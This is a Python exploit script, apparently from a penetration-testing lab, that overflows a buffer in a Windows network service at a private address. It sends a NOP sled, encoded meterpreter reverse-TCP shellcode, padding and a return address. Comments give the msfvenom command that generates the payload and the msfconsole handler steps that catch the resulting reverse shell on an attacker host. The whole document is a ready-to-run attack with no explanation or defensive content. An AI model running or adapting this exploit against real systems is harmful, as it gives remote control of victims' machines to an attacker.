import sys, socket
 
host = '172.16.4.86'
port = 4444

# generate payload to use below with
# msfvenom --payload windows/meterpreter/reverse_tcp LHOST=172.16.7.196 LPORT=7711 -b \x00\x0a -f python

buf =  "\x90"*200
buf += "\xda\xdd\xba\x24\xe1\xf2\x04\xd9\x74\x24\xf4\x5d\x29"
buf += "\xc9\xb1\x56\x83\xc5\x04\x31\x55\x14\x03\x55\x30\x03"
buf += "\x07\xf8\xd0\x41\xe8\x01\x20\x26\x60\xe4\x11\x66\x16"
buf += "\x6c\x01\x56\x5c\x20\xad\x1d\x30\xd1\x26\x53\x9d\xd6"
buf += "\x8f\xde\xfb\xd9\x10\x72\x3f\x7b\x92\x89\x6c\x5b\xab"
buf += "\x41\x61\x9a\xec\xbc\x88\xce\xa5\xcb\x3f\xff\xc2\x86"
buf += "\x83\x74\x98\x07\x84\x69\x68\x29\xa5\x3f\xe3\x70\x65"
buf += "\xc1\x20\x09\x2c\xd9\x25\x34\xe6\x52\x9d\xc2\xf9\xb2"
buf += "\xec\x2b\x55\xfb\xc1\xd9\xa7\x3b\xe5\x01\xd2\x35\x16"
buf += "\xbf\xe5\x81\x65\x1b\x63\x12\xcd\xe8\xd3\xfe\xec\x3d"
buf += "\x85\x75\xe2\x8a\xc1\xd2\xe6\x0d\x05\x69\x12\x85\xa8"
buf += "\xbe\x93\xdd\x8e\x1a\xf8\x86\xaf\x3b\xa4\x69\xcf\x5c"
buf += "\x07\xd5\x75\x16\xa5\x02\x04\x75\xa1\xe7\x25\x86\x31"
buf += "\x60\x3d\xf5\x03\x2f\x95\x91\x2f\xb8\x33\x65\x26\xae"
buf += "\xc3\xb9\x80\xbf\x3d\x3a\xf0\x96\xf9\x6e\xa0\x80\x28"
buf += "\x0f\x2b\x51\xd4\xda\xc1\x5b\x42\x49\x05\x58\xc6\xf9"
buf += "\x27\x60\xf8\xe6\xae\x86\x54\x49\xe0\x16\x15\x39\x40"
buf += "\xc7\xfd\x53\x4f\x38\x1d\x5c\x9a\x51\xb4\xb3\x72\x09"
buf += "\x21\x2d\xdf\xc1\xd0\xb2\xca\xaf\xd3\x39\xfe\x50\x9d"
buf += "\xc9\x8b\x42\xca\xad\x73\x9b\x0b\x58\x73\xf1\x0f\xca"
buf += "\x24\x6d\x12\x2b\x02\x32\xed\x1e\x11\x35\x11\xdf\x23"
buf += "\x4d\x24\x75\x0b\x39\x49\x99\x8b\xb9\x1f\xf3\x8b\xd1"
buf += "\xc7\xa7\xd8\xc4\x07\x72\x4d\x55\x92\x7d\x27\x09\x35"
buf += "\x16\xc5\x74\x71\xb9\x36\x53\x01\xbe\xc8\x21\x2e\x67"
buf += "\xa0\xd9\x6e\x97\x30\xb0\x6e\xc7\x58\x4f\x40\xe8\xa8"
buf += "\xb0\x4b\xa1\xa0\x3b\x1a\x03\x51\x3b\x37\xc5\xcf\x3c"
buf += "\xb4\xde\xe0\x47\xb5\xe1\x01\xb8\xdf\x85\x02\xb8\xdf"
buf += "\xbb\x3f\x6e\xe6\xc9\x7e\xb2\x5d\xc1\x35\x97\xf4\x48"
buf += "\x35\x8b\x07\x59"

buf += "A"*(1017-len(buf))
buf += '\xac\xdc\x47\x10'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
client.send(buf)
client.close()

# in msfconsole catch the shell with:
# use multi/handler
# set payload windows/meterpreter/reverse_tcp
# set LPORT 7711
# set LHOST 172.16.7.196
# exploit